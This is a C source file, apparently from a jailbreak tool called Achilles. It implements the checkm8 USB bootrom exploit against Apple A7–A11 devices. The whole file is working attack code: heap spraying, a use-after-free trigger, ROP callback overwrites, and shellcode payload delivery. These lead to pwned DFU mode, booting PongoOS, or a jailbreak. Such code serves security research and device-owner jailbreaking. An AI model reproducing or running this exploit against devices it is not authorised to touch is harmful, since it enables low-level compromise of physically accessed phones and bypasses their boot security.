#include <exploit/exploit.h>

bool bootingPongoOS;
char *pwndString = " PWND:[checkm8]";

// Purpose: Trigger a DFU mode reset on the device
bool checkm8Reset(device_t *device)
{
    transfer_ret_t transferRet;
    if (sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LENGTH, &transferRet)
    && transferRet.ret == USB_TRANSFER_OK && transferRet.sz == DFU_FILE_SUFFIX_LENGTH
    && DFUSetStateWaitReset(&device->handle) == true
    && sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, &transferRet)
    && transferRet.ret == USB_TRANSFER_OK && transferRet.sz == EP0_MAX_PACKET_SIZE)
    {
        return true;
    }
    sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
    return false;
}

// Purpose: Place the device into a stalled state
bool checkm8Stall(device_t *device)
{
    unsigned usbAbortTimeout = 10;
    transfer_ret_t transferRet;
    usb_handle_t *handle = &device->handle;
    while (sendUSBControlRequestAsyncNoData(handle, 0x80, DFU_ABORT, 0x304, 0xA, 0xC0, usbAbortTimeout, &transferRet)) {
        if (transferRet.sz < 0xC0
        && sendUSBControlRequestAsyncNoData(handle, 0x80, 6, 0x304, 0xA, 0x40, 1, &transferRet)
        && transferRet.sz == 0) {
            return true;
        }
        usbAbortTimeout = (usbAbortTimeout + 1) % 10;
    }
    return false;
}

// Purpose: Send a packet that will leak a zero-length packet
bool checkm8Leak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC0, transferRet);
}

// Purpose: Send a regular packet that will not leak a zero-length packet
bool checkm8NoLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0xC1, transferRet);
}

// Purpose: Stall the device-to-host endpoint
bool checkm8USBRequestStall(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x2, DFU_GETSTATUS, 0x0, 0x80, 0x0, transferRet);
}

// Purpose: Send a packet that will leak a zero-length packet
bool checkm8USBRequestLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x40, transferRet);
}

// Purpose: Send a regular packet that will not leak a zero-length packet
bool checkm8USBRequestNoLeak(device_t *device)
{
    transfer_ret_t *transferRet;
    return sendUSBControlRequestNoData(&device->handle, 0x80, DFU_ABORT, 0x304, 0x40A, 0x41, transferRet);
}

// Purpose: Spray the heap in order to craft a hole for the IO buffer allocation
bool checkm8HeapSpray(device_t *device)
{
    if (config_large_leak == 0) {
        if (cpid == 0x7000 || cpid == 0x7001 || cpid == 0x7002 || cpid == 0x8000 || cpid == 0x8003) {
            while (!checkm8USBRequestStall(device) || !checkm8USBRequestLeak(device) || !checkm8NoLeak(device)) {}
        } else {
            // Stall the endpoint and leak a ZLP
            if (!checkm8Stall(device)) { return false; }
            LOG(LOG_DEBUG, "Stalled endpoint");

            // We _can_ send 0x10 packets to create a perfect hole
            // for the IO buffer, but we can send 0x6 packets
            // so that allocations are shuffled, and IO buffer
            // is still allocated elsewhere, and this is a quicker solution
            // Send non-leaking packets
            for (int i = 1; i <= config_hole; i++)
            {
                if (!checkm8NoLeak(device)) { return false; }
            }
            LOG(LOG_DEBUG, "Sent %d regular packets", config_hole);

            // Leak a ZLP
            if (!checkm8USBRequestLeak(device)) { return false; }

            // Make sure setup packet has larger size to trigger ZLP leaks
            if (!checkm8NoLeak(device)) { return false; }
        }
    } else {
        for (size_t i = 0; i < config_large_leak; i++) {
            checkm8USBRequestStall(device);
        }
        sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
    }
    
    
    return true;
}

// Purpose: Trigger the use-after-free vulnerability
bool checkm8TriggerUaF(device_t *device)
{
    unsigned usb_abort_timeout = USB_TIMEOUT; // PR for T8011: 0.93 seconds starting on 10s timeout
	transfer_ret_t transfer_ret;

	while(sendUSBControlRequestAsyncNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SIZE, usb_abort_timeout, &transfer_ret)) {
		if(transfer_ret.sz < config_overwrite_pad 
        && sendUSBControlRequestNoData(&device->handle, 0, 0, 0, 0, config_overwrite_pad - transfer_ret.sz, &transfer_ret) 
        && transfer_ret.ret == USB_TRANSFER_STALL) {
			sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
			return true;
		}
		if(!sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL)) {
			break;
		}
		usb_abort_timeout = (usb_abort_timeout + 1) % 10;
	}
    
	return false;
}

// FOR COMPILATION //

#include <exploit/payloads/gaster/headers/payload_A9.h>
#include <exploit/payloads/gaster/headers/payload_notA9.h>
#include <exploit/payloads/gaster/headers/payload_handle_checkm8_request.h>

// // // // // // //

size_t prepareGasterPayload(uint8_t **buffer) {
    struct {
		uint64_t pwnd[2], payload_dest, dfu_handle_bus_reset, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, ttbr0_vrom_addr, patch_addr;
	} A9;
	struct {
		uint64_t pwnd[2], payload_dest, dfu_handle_bus_reset, dfu_handle_request, payload_off, payload_sz, memcpy_addr, gUSBSerialNumber, usb_create_string_descriptor, usb_serial_number_string_descriptor, patch_addr;
	} notA9;
	struct {
		uint64_t handle_interface_request, insecure_memory_base, exec_magic, done_magic, memc_magic, memcpy_addr, usb_core_do_transfer;
	} handle_checkm8_request;
	callback_t callbacks[] = {
		{ write_ttbr0, insecure_memory_base },
		{ tlbi, 0 },
		{ insecure_memory_base + ARM_16K_TT_L2_SIZE + ttbr0_sram_off + 2 * sizeof(uint64_t), 0 },
		{ write_ttbr0, ttbr0_addr },
		{ tlbi, 0 },
		{ ret_gadget, 0 }
	};
    size_t data_sz, payload_sz, payload_handle_checkm8_request_size;
    uint8_t *data, *payload, *payload_handle_checkm8_request;
    uint64_t reg;

    if(cpid == 0x8000 || cpid == 0x8003) {
		if(bins_payload_A9_bin_len > sizeof(A9)) {
			payload = malloc(bins_payload_A9_bin_len);
            memcpy(payload, bins_payload_A9_bin, bins_payload_A9_bin_len);
			payload_sz = bins_payload_A9_bin_len - sizeof(A9);
		} else {
			payload = NULL;
			payload_sz = 0;
		}
	} else if(cpid == 0x8960 || cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
        if(bins_payload_A9_bin_len > sizeof(notA9)) {
			payload = malloc(bins_payload_notA9_bin_len);
            memcpy(payload, bins_payload_notA9_bin, bins_payload_notA9_bin_len);
			payload_sz = bins_payload_notA9_bin_len - sizeof(notA9);
		} else {
			payload = NULL;
			payload_sz = 0;
		}
	} else {
        payload = NULL;
        payload_sz = 0;
        LOG(LOG_ERROR, "Failed to prepare payload for device, CPID: 0x%X", cpid);
    }
    if (payload != NULL) {
        if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8003 || cpid == 0x8000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {

            if(bins_payload_handle_checkm8_request_bin_len > sizeof(handle_checkm8_request)) {
				payload_handle_checkm8_request = malloc(bins_payload_handle_checkm8_request_bin_len);
                memcpy(payload_handle_checkm8_request, bins_payload_handle_checkm8_request_bin, bins_payload_handle_checkm8_request_bin_len);
				payload_handle_checkm8_request_size = bins_payload_handle_checkm8_request_bin_len - sizeof(handle_checkm8_request);
				if(cpid == 0x8003 || cpid == 0x8000) {
					data = calloc(1, payload_sz + sizeof(A9) + payload_handle_checkm8_request_size + sizeof(handle_checkm8_request));
				} else if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
					data = calloc(1, DFU_MAX_TRANSFER_SIZE + payload_sz + sizeof(notA9) + payload_handle_checkm8_request_size + sizeof(handle_checkm8_request));
				} else {
					data = calloc(1, payload_sz + sizeof(notA9) + payload_handle_checkm8_request_size + sizeof(handle_checkm8_request));
				}
			} else {
				payload_handle_checkm8_request = NULL;
				payload_handle_checkm8_request_size = 0;
				data = NULL;
			}
		} else {
			payload_handle_checkm8_request = NULL;
			payload_handle_checkm8_request_size = 0;
			data = NULL;
            return 0;
		}
        if (data != NULL) {
            LOG(LOG_DEBUG, "Preparing payload for device, CPID: 0x%X", cpid);
            if (cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
                reg = 0x1000006A5;
                memcpy(data + ttbr0_vrom_off, &reg, sizeof(reg));
                reg = 0x60000100000625;
                memcpy(data + ttbr0_vrom_off + sizeof(reg), &reg, sizeof(reg));
                reg = 0x60000180000625;
                memcpy(data + ttbr0_sram_off, &reg, sizeof(reg));
                reg = 0x1800006A5;
                memcpy(data + ttbr0_sram_off + sizeof(reg), &reg, sizeof(reg));
                generateUSBROPCallbacks(data + offsetof(dfu_callback_t, callback), insecure_memory_base, callbacks, sizeof(callbacks) / sizeof(callbacks[0]));
                data_sz = ttbr0_sram_off + 2 * sizeof(reg);
            } else {
                data_sz = 0;
            }
            memcpy(data + data_sz, payload, payload_sz);
            data_sz += payload_sz;
            if (cpid == 0x8003 || cpid == 0x8000) {
                memset(A9.pwnd, '\0', sizeof(A9.pwnd));
                memcpy(A9.pwnd, pwndString, strlen(pwndString));
                A9.payload_dest = boot_tramp_end - payload_handle_checkm8_request_size - sizeof(handle_checkm8_request);
                A9.dfu_handle_bus_reset = dfu_handle_bus_reset;
                A9.dfu_handle_request = dfu_handle_request;
                A9.payload_off = payload_sz + sizeof(A9);
                A9.payload_sz = payload_handle_checkm8_request_size + sizeof(handle_checkm8_request);
                A9.memcpy_addr = memcpy_addr;
                A9.gUSBSerialNumber = gUSBSerialNumber;
                A9.usb_create_string_descriptor = usb_create_string_descriptor;
                A9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
                A9.ttbr0_vrom_addr = ttbr0_addr + ttbr0_vrom_off;
                A9.patch_addr = patch_addr;
                memcpy(data + data_sz, &A9, sizeof(A9));
                data_sz += sizeof(A9);
                memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_size);
                data_sz += payload_handle_checkm8_request_size;
                handle_checkm8_request.handle_interface_request = handle_interface_request;
                handle_checkm8_request.insecure_memory_base = insecure_memory_base;
                handle_checkm8_request.exec_magic = EXEC_MAGIC;
                handle_checkm8_request.done_magic = DONE_MAGIC;
				handle_checkm8_request.memc_magic = MEMC_MAGIC;
				handle_checkm8_request.memcpy_addr = memcpy_addr;
				handle_checkm8_request.usb_core_do_transfer = usb_core_do_transfer;
				memcpy(data + data_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
				data_sz += sizeof(handle_checkm8_request);
            } else if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
                memset(notA9.pwnd, '\0', sizeof(notA9.pwnd));
				memcpy(notA9.pwnd, pwndString, strlen(pwndString));
				notA9.payload_dest = boot_tramp_end - payload_handle_checkm8_request_size - sizeof(handle_checkm8_request);
				notA9.dfu_handle_bus_reset = dfu_handle_bus_reset;
				notA9.dfu_handle_request = dfu_handle_request;
				notA9.payload_off = payload_sz + sizeof(notA9);
				notA9.payload_sz = payload_handle_checkm8_request_size + sizeof(handle_checkm8_request);
				notA9.memcpy_addr = memcpy_addr;
				notA9.gUSBSerialNumber = gUSBSerialNumber;
				notA9.usb_create_string_descriptor = usb_create_string_descriptor;
				notA9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
				notA9.patch_addr = patch_addr;
				if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
					notA9.patch_addr += ARM_16K_TT_L2_SIZE;
				}
				memcpy(data + data_sz, &notA9, sizeof(notA9));
				data_sz += sizeof(notA9);
				memcpy(data + data_sz, payload_handle_checkm8_request, payload_handle_checkm8_request_size);
				data_sz += payload_handle_checkm8_request_size;
				handle_checkm8_request.handle_interface_request = handle_interface_request;
				handle_checkm8_request.insecure_memory_base = insecure_memory_base;
				handle_checkm8_request.exec_magic = EXEC_MAGIC;
				handle_checkm8_request.done_magic = DONE_MAGIC;
				handle_checkm8_request.memc_magic = MEMC_MAGIC;
				handle_checkm8_request.memcpy_addr = memcpy_addr;
				handle_checkm8_request.usb_core_do_transfer = usb_core_do_transfer;
				memcpy(data + data_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
				data_sz += sizeof(handle_checkm8_request);
            }
            *buffer = data;
            return data_sz;
        } else {
            return 0;
        }
    }
    return 0;
}

// FOR COMPILATION //

#include <boot/payloads/checkra1n/headers/yolo_s8000.h>
#include <boot/payloads/checkra1n/headers/yolo_s8001.h>
#include <boot/payloads/checkra1n/headers/yolo_s8003.h>
#include <boot/payloads/checkra1n/headers/yolo_t7000.h>
#include <boot/payloads/checkra1n/headers/yolo_t7001.h>
#include <boot/payloads/checkra1n/headers/yolo_t8010.h>
#include <boot/payloads/checkra1n/headers/yolo_t8011.h>
#include <boot/payloads/checkra1n/headers/yolo_t8015.h>

// // // // // // //

// Purpose: Send the payload and overwrite to the device and trigger shellcode execution
bool checkm8SendPayload(device_t *device)
{
    uint8_t *payload;
    size_t payloadSize;

    uint64_t *overwrite;
    size_t overwriteSize;

    // Prepare the overwrite
    if (bootingPongoOS) {
        LOG(LOG_DEBUG, "Preparing overwrite for YoloDFU mode");
        void *blank[DFU_MAX_TRANSFER_SIZE];
        memset(&blank, '\0', DFU_MAX_TRANSFER_SIZE);
        overwrite = (uint64_t *)blank;
        overwrite[5] = insecure_memory_base;
        overwriteSize = 0x30; // It will always be 0x30
    }
    else {
        if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8003 || cpid == 0x8000) {
            checkm8_overwrite_t checkm8_overwrite;
            memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite_t));
            checkm8_overwrite.callback.callback = insecure_memory_base;
            overwrite = (uint64_t *)&checkm8_overwrite;
            overwriteSize = sizeof(checkm8_overwrite);
        }
        else if (cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
            checkm8_overwrite_t checkm8_overwrite;
            memset(&checkm8_overwrite, '\0', sizeof(checkm8_overwrite_t));
            checkm8_overwrite.callback.callback = nop_gadget;
            checkm8_overwrite.callback.next = insecure_memory_base;
            checkm8_overwrite.heap_pad_0 = 0xF7F6F5F4F3F2F1F0;
			checkm8_overwrite.heap_pad_1 = 0xFFFEFDFCFBFAF9F8;
            overwrite = (uint64_t *)&checkm8_overwrite;
            overwriteSize = sizeof(checkm8_overwrite);
        }
        else {
            LOG(LOG_ERROR, "CPID not supported!");
        }
    }

    // Prepare the payload
    if (bootingPongoOS) {
        LOG(LOG_DEBUG, "Selecting YoloDFU payload for CPID 0x%X", cpid);
        switch (cpid)
        {
        case 0x8000:
            payload = malloc(yolo_s8000_bin_len);
            memcpy(payload, yolo_s8000_bin, yolo_s8000_bin_len);
            payloadSize = yolo_s8000_bin_len;
            break;
        case 0x8001:
            payload = malloc(yolo_s8001_bin_len);
            memcpy(payload, yolo_s8001_bin, yolo_s8001_bin_len);
            payloadSize = yolo_s8001_bin_len;
            break;
        case 0x8003:
            payload = malloc(yolo_s8003_bin_len);
            memcpy(payload, yolo_s8003_bin, yolo_s8003_bin_len);
            payloadSize = yolo_s8003_bin_len;
            break;
        case 0x7000:
            payload = malloc(yolo_t7000_bin_len);
            memcpy(payload, yolo_t7000_bin, yolo_t7000_bin_len);
            payloadSize = yolo_t7000_bin_len;
            break;
        case 0x7001:
            payload = malloc(yolo_t7001_bin_len);
            memcpy(payload, yolo_t7001_bin, yolo_t7001_bin_len);
            payloadSize = yolo_t7001_bin_len;
            break;
        case 0x8010:
            payload = malloc(yolo_t8010_bin_len);
            memcpy(payload, yolo_t8010_bin, yolo_t8010_bin_len);
            payloadSize = yolo_t8010_bin_len;
            break;
        case 0x8011:
            payload = malloc(yolo_t8011_bin_len);
            memcpy(payload, yolo_t8011_bin, yolo_t8011_bin_len);
            payloadSize = yolo_t8011_bin_len;
            break;
        case 0x8015:
            payload = malloc(yolo_t8015_bin_len);
            memcpy(payload, yolo_t8015_bin, yolo_t8015_bin_len);
            payloadSize = yolo_t8015_bin_len;
            break;
        default:
            payload = NULL;
            payloadSize = 0;
            LOG(LOG_ERROR, "CPID not supported!");
            break;
        }
    } else {
        payloadSize = prepareGasterPayload(&payload);
        if (payloadSize == 0) {
            LOG(LOG_ERROR, "Failed to prepare payload");
            return false;
        }
    }

    // Sanity checks
    if (overwrite == NULL || overwriteSize == 0) {
        LOG(LOG_ERROR, "Failed to read overwrite file");
        if (overwrite == NULL) {
            LOG(LOG_ERROR, "Overwrite is NULL");
        }
        if (overwriteSize == 0) {
            LOG(LOG_ERROR, "Overwrite size is 0");
        }
        return false;
    }

    if (payload == NULL || payloadSize == 0) {
        LOG(LOG_ERROR, "Failed to read payload file");
        if (payload == NULL) {
            LOG(LOG_ERROR, "Payload is NULL");
        }
        if (payloadSize == 0) {
            LOG(LOG_ERROR, "Payload size is 0");
        }
        return false;
    }

    LOG(LOG_DEBUG, "Prepared payload and overwrite");

    transfer_ret_t transferRet;

    if (cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
        // Stall endpoint
        if (!checkm8USBRequestStall(device))
        {
            LOG(LOG_ERROR, "Failed to stall endpoint");
            return false;
        }

        if (!checkm8USBRequestLeak(device))
        {
            LOG(LOG_ERROR, "Failed to send packet");
            return false;
        }
    }

    for (size_t i = 0; i < 2; i++) {
		sendUSBControlRequestNoData(&device->handle, 2, 3, 0, 0x80, 0, NULL);
	}

    LOG(LOG_DEBUG, "Sending overwrite of size 0x%2X", overwriteSize);

    if (sendUSBControlRequest(&device->handle, 0, 0, 0, 0, overwrite, overwriteSize, &transferRet)
    && transferRet.ret == USB_TRANSFER_STALL)
    {
        // Need to figure out why gaster needs this but PongoOS doesn't
        if (!bootingPongoOS) {
            if (!sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SIZE, NULL)) {
                return false;
            }
        }
        bool ret = true;
        size_t packetSize;
        int i;
        LOG(LOG_DEBUG, "Sending payload of size 0x%X", payloadSize);

        // Send the payload
        for(i = 0; ret && i < payloadSize; i += packetSize) {
            packetSize = MIN(payloadSize - i, DFU_MAX_TRANSFER_SIZE);
            LOG(LOG_DEBUG, "Sending payload chunk of size 0x%X", packetSize);
            ret = sendUSBControlRequest(&device->handle, 0x21, DFU_DNLOAD, 0, 0, &payload[i], packetSize, NULL);
        }
        if (ret) {
            if (cpid != 0x8011) {
                sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, DFU_FILE_SUFFIX_LENGTH, NULL);
                sendUSBControlRequestNoData(&device->handle, 0x21, DFU_DNLOAD, 0, 0, 0, NULL);
            }
        } else {
            LOG(LOG_ERROR, "Failed to send payload, transferred 0x%X of 0x%X bytes", i, payloadSize);
            return false;
        }
        if (bootingPongoOS) {
            LOG(LOG_INFO,  "Waiting for device to reconnect in download mode");
        } else {
            LOG(LOG_DEBUG, "Sent payload, about to trigger execution");
        }
        ret = sendUSBControlRequestNoData(&device->handle, 0x21, DFU_CLRSTATUS, 0, 0, 0, NULL);
    } else {
        LOG(LOG_ERROR, "Failed to send overwrite");
        return false;
    }
    if (payload != NULL) { free(payload); }

    return true;
}

// Purpose: Check if the device has been successfully exploited
int checkm8Done(device_t *device)
{
    return isSerialNumberPwned(getDeviceSerialNumber(&device->handle));
}

// Purpose: Get the device into DFU mode
int checkm8PrepareDevice(device_t *device) {
    int ret = findDevice(device, false);
    if (ret == -1)
    {
        return -1;
    }

    if (device->mode == MODE_NORMAL) {
        LOG(LOG_SUCCESS, "Found device in normal mode");
        if (enterRecoveryMode() != 0) {
            LOG(LOG_ERROR, "Failed to place device into recovery mode");
            return -1;
        }
        LOG(LOG_INFO, "Waiting for device to enter recovery mode");
        if (waitForDeviceInMode(device, MODE_RECOVERY, 20) != 0) {
            LOG(LOG_ERROR, "Device with udid %s failed to enter recovery mode", device->serialNumber);
            return -1;
        }
        LOG(LOG_SUCCESS, "Device entered recovery mode successfully!", device->serialNumber);
    }

    if (device->mode == MODE_RECOVERY) {
        waitUSBHandle(&device->handle, NULL, NULL);
        bool ret = sendRecoveryModeCommand(&device->handle, "setenv auto-boot true");
        if (!ret) {
            LOG(LOG_ERROR, "Failed to send auto-boot true");
        }
        ret = sendRecoveryModeCommand(&device->handle, "saveenv");
        if (!ret) {
            LOG(LOG_ERROR, "Failed to send saveenv");
        }
        LOG(LOG_DEBUG, "Sent auto-boot true and saveenv");
        LOG_NO_NEWLINE(LOG_INFO, "Press Enter when you are ready to enter DFU mode");
        getchar();
        DFUHelper();
        if (waitForDeviceInMode(device, MODE_DFU, 30) != 0) {
            LOG(LOG_ERROR, "Could not find device in DFU mode after 30 seconds", device->serialNumber);
            return -1;
        }
        LOG(LOG_SUCCESS, "Device entered DFU mode successfully!");
    }

    if (isSerialNumberPwned(device->serialNumber) && !isInDownloadMode(device->serialNumber))
    {
        LOG(LOG_ERROR, "Device is already in pwned DFU mode, not performing exploit");
        return 1;
    }
    LOG(LOG_DEBUG, "Device serial number: %s", device->serialNumber);
    
    return 0;
}

char *stageToString(int stage) {
    switch (stage) {
        case STAGE_RESET:
            return "Reset";
        case STAGE_HEAP_SPRAY:
            return "Heap spray";
        case STAGE_TRIGGER:
            return "UaF trigger";
        case STAGE_PATCH:
            return bootingPongoOS ? "Download mode" : "Patching";
        case STAGE_DONE:
            return "Done";
        case STAGE_PONGO:
            return "PongoOS";
        case STAGE_JAILBREAK:
            return "Jailbreak";
        default:
            return "Unknown";
    }
}

int checkm8()
{
    device_t device;
    bootingPongoOS = getArgumentByName("PongoOS")->boolVal || getArgumentByName("Jailbreak")->boolVal;
    initUSBHandle(&device.handle, 0x5ac, 0x1227);
    if (checkm8PrepareDevice(&device) != 0)
    {
        LOG(LOG_ERROR, "Failed to prepare device");
        return -1;
    }
    bool pwned;
    waitUSBHandle(&device.handle, &checkm8CheckUSBDevice, &pwned); // So we can check CPID
    char *serial = getDeviceSerialNumber(&device.handle);
    closeUSBHandle(&device.handle);
    if (!isSupported(cpid)) {
        LOG(LOG_ERROR, "This device is not supported by Achilles");
        LOG(LOG_ERROR, "Please keep in mind that Achilles supports A7-A11 only");
        return -1;
    }
    if (bootingPongoOS && !(cpid == 0x8000 || cpid == 0x8001 || cpid == 0x8003 || cpid == 0x7000
    || cpid == 0x7001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015)) {
        LOG(LOG_ERROR, "PongoOS is not supported on this device, CPID: 0x%X", cpid);
        return -1;
    }

    bool ret;
    struct timespec start, end;

    if (!getArgumentByName("Quick mode")->boolVal) {
        LOG_NO_NEWLINE(LOG_INFO, "Press enter to start exploit");
        getchar();
    }

    LOG(LOG_VERBOSE, bootingPongoOS ? "Exploiting with checkm8 and booting PongoOS" : "Exploiting with checkm8");

    int stage = STAGE_RESET;
    int stageForLogging = STAGE_RESET;
    char *finalSerial = NULL;

    if (isInDownloadMode(serial)) {
        stage = STAGE_PONGO;
    } else if (isInPongoOS(serial) && getArgumentByName("Jailbreak")->set) {
        LOG(LOG_SUCCESS, "Found device in PongoOS");
        stage = STAGE_JAILBREAK;
    }

    LOG(LOG_INFO, "Starting exploit");
    clock_gettime(CLOCK_MONOTONIC, &start);
    while (stage != STAGE_DONE && waitUSBHandle(&device.handle, &checkm8CheckUSBDevice, &pwned)) {
        if (!pwned) {
            if (stage == STAGE_RESET) {
                LOG(LOG_VERBOSE, "Resetting device");
                ret = checkm8Reset(&device);
                stage = STAGE_HEAP_SPRAY;
                stageForLogging = STAGE_RESET;
            }
            else if (stage == STAGE_HEAP_SPRAY) {
                LOG(LOG_INFO, "Spraying the heap");
                ret = checkm8HeapSpray(&device);
                stage = STAGE_TRIGGER;
                stageForLogging = STAGE_HEAP_SPRAY;
            }
            else if (stage == STAGE_TRIGGER) {
                LOG(LOG_INFO, "Triggering UaF");
                ret = checkm8TriggerUaF(&device);
                stage = STAGE_PATCH;
                stageForLogging = STAGE_TRIGGER;
            }
            else if (stage == STAGE_PATCH) {
                LOG(LOG_INFO, bootingPongoOS ? "Sending YoloDFU payload" : "Patching");
                ret = checkm8SendPayload(&device);
                stageForLogging = STAGE_PATCH;
                // Try to re-init so serial number is updated
                resetUSBHandle(&device.handle);
                closeUSBHandle(&device.handle);
                sleep_ms(100);
                initUSBHandle(&device.handle, 0x5ac, 0x1227);
                waitUSBHandle(&device.handle, &checkm8CheckUSBDevice, &pwned);
                finalSerial = getDeviceSerialNumber(&device.handle);
                if (isSerialNumberPwned(finalSerial) && !bootingPongoOS) {
                    pwned = true;
                }
                stageForLogging = STAGE_PATCH;
                stage = (isSerialNumberPwned(finalSerial) && bootingPongoOS) ? STAGE_PONGO : STAGE_DONE;
            } else if (stage == STAGE_PONGO) {
                LOG(LOG_INFO, "Exploit complete, booting PongoOS");
                ret = bootPongoOS(&device);
                if (!ret) {
                    LOG(LOG_ERROR, "Failed to boot PongoOS");
                } else {
                    clock_gettime(CLOCK_MONOTONIC, &end);
                    double timeTaken = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
                    LOG(LOG_SUCCESS, "Successfully booted PongoOS in %.2f seconds", timeTaken);
                }
                stage = (getArgumentByName("Jailbreak")->boolVal) ? STAGE_JAILBREAK : STAGE_DONE;
                stageForLogging = STAGE_PONGO;
            } else {
                if (access("src/kernel/patchfinder/kpf", F_OK) == 0) {
                    if (access("src/userland/jbinit/ramdisk.dmg", F_OK) == 0) {
                        if (access("src/userland/jbinit/binpack.dmg", F_OK) == 0) {
                            extern void jailbreakBoot(usb_handle_t *handle);
                            jailbreakBoot(&device.handle);
                        } else {
                            LOG(LOG_ERROR, "Please ensure src/userland/jbinit/binpack.dmg exists");
                        }
                    } else {
                        LOG(LOG_ERROR, "Please ensure src/userland/jbinit/ramdisk.dmg exists");
                    }
                } else {
                    LOG(LOG_ERROR, "Please ensure src/kernel/patchfinder/kpf exists");
                }
                stage = STAGE_DONE;
                stageForLogging = STAGE_JAILBREAK;
            }

            if (ret && stageForLogging != STAGE_PONGO && stageForLogging != STAGE_JAILBREAK) {
                LOG(LOG_VERBOSE, "%s completed successfully", stageToString(stageForLogging));
            } else if (stageForLogging != STAGE_PONGO && stageForLogging != STAGE_JAILBREAK) {
                LOG(LOG_ERROR, "%s failed", stageToString(stageForLogging));
                if (stage != STAGE_PATCH && stage != STAGE_DONE) {
                    stage = STAGE_RESET;
                } else {
                    stage = STAGE_DONE;
                }
            }
            resetUSBHandle(&device.handle);
        }
           
        closeUSBHandle(&device.handle);
    }
    if (!bootingPongoOS) {
        if (!pwned) {
            LOG(LOG_ERROR, "Exploit failed"); 
            return -1;
        }
        clock_gettime(CLOCK_MONOTONIC, &end);
        double timeTaken = (end.tv_sec - start.tv_sec) + (end.tv_nsec - start.tv_nsec) / 1e9;
        LOG(LOG_SUCCESS, "Exploit succeeded");
        LOG(LOG_INFO, "Exploited in %.2f seconds", timeTaken);
        if (strcmp(finalSerial, "(null)") != 0) { LOG(LOG_VERBOSE, "Serial number: %s", finalSerial); }
    }
    return 0;
}